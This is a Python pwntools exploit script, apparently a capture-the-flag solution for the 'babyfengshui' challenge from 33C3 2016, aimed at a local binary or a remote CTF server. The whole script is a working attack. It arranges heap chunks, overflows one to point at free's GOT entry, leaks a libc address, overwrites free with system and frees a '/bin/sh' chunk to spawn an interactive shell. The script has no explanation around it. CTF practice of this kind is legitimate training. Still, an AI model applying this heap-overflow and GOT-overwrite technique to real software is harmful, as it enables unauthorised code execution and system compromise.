import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./babyfengshui_33c3_2016')
	elf=ELF('./babyfengshui_33c3_2016')
	libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
else :
	io=remote('buuoj.cn',20002)
	elf=ELF('./babyfengshui_33c3_2016')
	libc=ELF('./libc')


def add(a,b,c,d):
	io.sendlineafter('Action: ','0')
	io.sendlineafter('escription: ',str(a))
	io.sendlineafter('name: ',b)
	io.sendlineafter('text length: ',str(c))
	io.sendlineafter('text: ',d)


def delete(a):
	io.sendlineafter('Action: ','1')
	io.sendlineafter('index: ',str(a))

def show(a):
	io.sendlineafter('Action: ','2')
	io.sendlineafter('index: ',str(a))

def edit(a,b,c):
	io.sendlineafter('Action: ','3')
	io.sendlineafter('index: ',str(a))
	io.sendlineafter('text length: ',str(b))
	io.sendlineafter('text: ',c)

add(0x30,'a',0x20,'b')
add(0x30,'a',0x20,'b')
add(0x30,'/bin/sh\x00',0x20,'/bin/sh\x00')
delete(0)
add(0x40,'d',1,'d')
free_got = elf.got["free"]
payload = "a" * (0x30 + 0x88 + (0x30 + 8) + 8) + p32(free_got)
# debug()
#gdb.attach(io,'b *0x080487af')
add(0x30 , "d" , len(payload) , payload) # 3 - 4
show(1)
free_addr=u32(io.recvuntil('0:')[0x14:0x18])
libc_base=free_addr-libc.sym["free"]
system=libc_base+libc.sym["system"]
edit(1,5,p32(system))
delete(2)




io.interactive()